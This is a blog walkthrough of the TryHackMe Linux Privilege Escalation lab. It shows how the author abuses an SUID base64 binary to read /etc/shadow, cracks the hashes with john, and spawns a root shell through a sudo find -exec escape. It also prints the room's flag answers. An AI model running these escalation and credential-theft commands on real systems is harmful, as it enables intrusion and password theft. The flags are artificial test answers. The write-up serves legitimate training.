---
title: "Tryhackme - Linux Privilege Escalation"
date: 2025-01-24 12:00:00 -500 
categories: [Tryhackme, Linux Privilege Escalation]
tags: [ctf,exploit,flags,tryhackme,pentesting,net,sec,privilege,escalation,liunux]
author: Christoph K
---
[TryHackMe- Linux Privilege Escalation ](https://tryhackme.com/r/room/linprivesc)




## Introduction

    You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
    We designed this room to help you build a thorough methodology for Linux privilege escalation that will be very useful in exams such as OSCP and your penetration testing engagements.

    Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.

    You can access the target machine over your browser or use the SSH credentials below.

    Username: leonard
    Password: Penny123



### Tasks:

- What is the content of the flag1.txt file?
- What is the content of the flag2.txt file?



### Privilege Escalation

In this case, we have already captured an user so we can login as `leonard`. The task here is to get more privileges. 

We use `ssh` to connect to the machine as `leonard`


```bash
└─$ ssh leonard@10.10.231.2
The authenticity of host '10.10.231.2 (10.10.231.2)' can't be established.
ED25519 key fingerprint is SHA256:1dMTd32PB7hStUUoiefpE+ckRSQl9B6tlu4mBNO2v4k.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.231.2' (ED25519) to the list of known hosts.
(leonard@10.10.231.2) Password:
Last login: Sun Jan 26 13:09:24 2025 from ip-10-100-2-141.eu-west-1.compute.internal
[leonard@ip-10-10-231-2 ~]$
```

There are many ways to escalate our privleges and a lot of locations to look. I use following `to do` list as an user:

- Check what the user is allowed to open as sudo (-sudo -l)
- Check `SUID`  
- Check `getcap`(Capabilities privileges)
- Check `crontab`for scripts or things we can execute with wither rights
- Check `NFS shares`


Of course we can use `linepeas` to search for vulnerabilities but we want to practise our `manually privliege escalation` here.


#### Check commands the user is allowed using sudo 

The sudo -l command in Linux is used to list the commands a user is allowed to execute using sudo on the system.

```bash

[leonard@ip-10-10-231-2 ~]$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

```

Okay we dont have anything here, so lets check the next one:

#### Check SUID permission


We can check the `SUID` with `find`.

`find / -type f -perm -04000 -ls /2>/dev/null`




```bash

Usage: find [-H] [-L] [-P] [-Olevel] [-D help|tree|search|stat|rates|opt|exec] [path...] [expression]
[leonard@ip-10-10-231-2 ~]$ find / -type f -perm -04000 -ls 2>/dev/null
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1

```

This is a interesting list. There are possibly several ways to abuse one of those files but I used `base64`.



#### Using base64 to open /etc/shadow


We can use `base64` as `sudo` so we have access to `/etc/shadow`. With that we can `dump` the user database and `crack` it with `john`:


```bash
[leonard@ip-10-10-231-2 ~]$ base64 /etc/shadow | base64 -d > shadow.txt
[leonard@ip-10-10-231-2 ~]$ base64 /etc/passwd | base64 -d > passwd.txt
```

I created two files: 
- shadow.txt
- passwd.txt

With those two we can try to crack them.

First we have to use `unshadow` to create a crackable file for `john`:


`unshadow passwd.txt shadow.txt > passwords.txt`


Now we can crack the file `password.txt` with `john`: 

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (missy)
Penny123         (leonard)
2g 0:00:21:34 DONE (2025-01-26 13:35) 0.001545g/s 11083p/s 11633c/s 11633C/s !!!playboy!!!7..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We have another user `missy`. 


#### Checking user missy

We can login with `missy` on `ssh` and check if she has more permissions than `leonard`:



```bash

[missy@ip-10-10-231-2 ~]$ sudo -l
Matching Defaults entries for missy on ip-10-10-231-2:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER
    LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User missy may run the following commands on ip-10-10-231-2:
    (ALL) NOPASSWD: /usr/bin/find`
```


Okay that is really nice, we can use `find` as `sudo`. We can check `GTFObins` if we find a possiblity to use the command to escalate our privileges.

We can use the following command to get a root shell:

`sudo find . -exec /bin/sh \; -quit`


Lets try it:


```bash

sh-4.2$ sudo find . -exec /bin/sh \; -quit
sh-4.2# whoami
root
```


#### Getting flag1:

Now it is easy, we have already `root` privileges on the machine, so we can just search and open the flags:

```bash

sh-4.2# find / -name flag1.txt
/home/missy/Documents/flag1.txt
sh-4.2# cat /home/missy/D
Desktop/   Documents/ Downloads/
sh-4.2# cat /home/missy/Documents/flag1.txt
THM-42828719920544
```

Answer Flag1: `THM-42828719920544`



#### Getting flag2: 

And the next one:

```bash

sh-4.2# find / -name flag2.txt 2>/dev/null
/home/rootflag/flag2.txt
sh-4.2# cat /home/rootflag/flag2.txt
THM-168824782390238
sh-4.2#

```

Answer Flag2: `THM-168824782390238`



## Thoughts:

This is a fantastic room. I learned a lot about `escalating privileges` and want to recommend everyone to check out the room. 
There is a lot of different labs and every lab shows you another way to get `root`. Fantastic!

